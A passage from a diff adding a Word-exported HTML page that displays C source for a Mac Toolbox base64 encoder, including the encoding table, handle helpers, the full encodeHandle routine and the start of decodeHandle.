+style="mso-spacerun: yes">  </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'>static 
+    char encodingTable [64] = {<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes">    </span>'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P',<span
+style="mso-spacerun: yes">    </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes">    </span>'Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f',<span
+style="mso-spacerun: yes">    </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes">    </span>'g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v',<span
+style="mso-spacerun: yes">    </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes">    </span>'w','x','y','z','0','1','2','3','4','5','6','7','8','9','+','/'<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>};<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes">  </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'>static 
+    unsigned long gethandlesize (Handle h) {<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>return (GetHandleSize (h));<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>} /*gethandlesize*/<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span>static boolean sethandlesize (Handle h, unsigned 
+    long newsize) {<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><span style='mso-tab-count:1'>                
+    </span>SetHandleSize (h, newsize);<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><span style='mso-tab-count:1'>               
+    </span>return (MemError () == noErr);<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>} /*sethandlesize*/<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span>static unsigned char gethandlechar (Handle h, 
+    unsigned long ix) {<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>return ((*h) [ix]);<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>} /*gethandlechar*/<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span>static void sethandlechar (Handle h, unsigned 
+    long ix, unsigned char ch) {<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>(*h) [ix] = ch;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>} /*sethandlechar*/<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span>static boolean encodeHandle (Handle htext, Handle 
+    h64, short linelength) { <o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>/*<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>encode the handle. some funny stuff 
+    about linelength -- it only makes<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>sense to make it a multiple of 
+    4. if it's not a multiple of 4, we make it<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>so (by only checking it every 4 
+    characters.<span style="mso-spacerun: yes">  </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>further, if it's 0, we don't add 
+    any line breaks at all.<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>*/<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>unsigned long ixtext;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>unsigned long lentext;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>unsigned long origsize;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>long ctremaining;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>unsigned char ch;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>unsigned char inbuf [3], outbuf 
+    [4];<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>short i;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>short charsonline = 0, ctcopy;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes">    </span><span style='mso-tab-count:1'>            
+    </span>ixtext = 0;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><span style='mso-tab-count:1'>               
+    </span>lentext = gethandlesize (htext);<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><span style='mso-tab-count:1'>               
+    </span>while (true) {<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                                </span>ctremaining = lentext 
+    - ixtext;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                </span>if (ctremaining &lt;= 0)<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                </span>break;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                                                
+    </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                                </span>for (i = 0; i &lt; 
+    3; i++) { <o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                                </span>unsigned long ix 
+    = ixtext + i;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                                </span>if (ix &lt; lentext)<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                                </span>inbuf [i] = gethandlechar 
+    (htext, ix);<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                </span>else<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                                </span>inbuf [i] = 0;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                </span>} /*for*/<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                                </span>outbuf [0] = (inbuf 
+    [0] &amp; 0xFC) &gt;&gt; 2;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes">    </span><span style='mso-tab-count:1'>            
+                    </span>outbuf [1] = ((inbuf [0] &amp; 0x03) &lt;&lt; 4) | 
+    ((inbuf [1] &amp; 0xF0) &gt;&gt; 4);<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes">    </span><span style='mso-tab-count:1'>            
+                    </span>outbuf [2] = ((inbuf [1] &amp; 0x0F) &lt;&lt; 2) | 
+    ((inbuf [2] &amp; 0xC0) &gt;&gt; 6);<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes">    </span><span style='mso-tab-count:1'>            
+                    </span>outbuf [3] = inbuf [2] &amp; 0x3F;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                                </span>origsize = gethandlesize 
+    (h64);<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                                </span>if (!sethandlesize 
+    (h64, origsize + 4))<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                </span>return (false);<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                                </span>ctcopy = 4;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                                </span>switch (ctremaining) 
+    {<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                </span>case 1: <o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                                </span>ctcopy = 2; <o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                                </span>break;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                </span>case 2: <o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                                </span>ctcopy = 3; <o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                                </span>break;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                </span>} /*switch*/<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                                </span>for (i = 0; i &lt; 
+    ctcopy; i++)<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                </span>sethandlechar (h64, origsize + 
+    i, encodingTable [outbuf [i]]);<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                                </span>for (i = ctcopy; 
+    i &lt; 4; i++)<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                </span>sethandlechar (h64, origsize + 
+    i, '=');<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                                </span>ixtext += 3;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                                </span>charsonline += 
+    4;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                                </span>if (linelength 
+    &gt; 0) { /*DW 4/8/97 -- 0 means no line breaks*/<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                                </span>if (charsonline 
+    &gt;= linelength) {<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                                </span>charsonline = 0;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                                </span>origsize = gethandlesize 
+    (h64);<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                                </span>if (!sethandlesize 
+    (h64, origsize + 1))<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                                                
+    </span><span
+style='mso-tab-count:1'>                </span>return (false);<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                                </span>sethandlechar (h64, 
+    origsize, '\n');<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                                </span>}<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                </span>}<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                                </span>} /*while*/<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><span style='mso-tab-count:1'>               
+    </span>return (true);<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>} /*encodeHandle*/<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span>static boolean decodeHandle (Handle h64, Handle 
+    htext) {<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>unsigned long ixtext;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>unsigned long lentext;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>unsigned long origsize;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>unsigned long ctremaining;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>unsigned char ch;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>unsigned char inbuf [3], outbuf 
+    [4];<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>short i, ixinbuf;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>boolean flignore;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>boolean flendtext = false;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
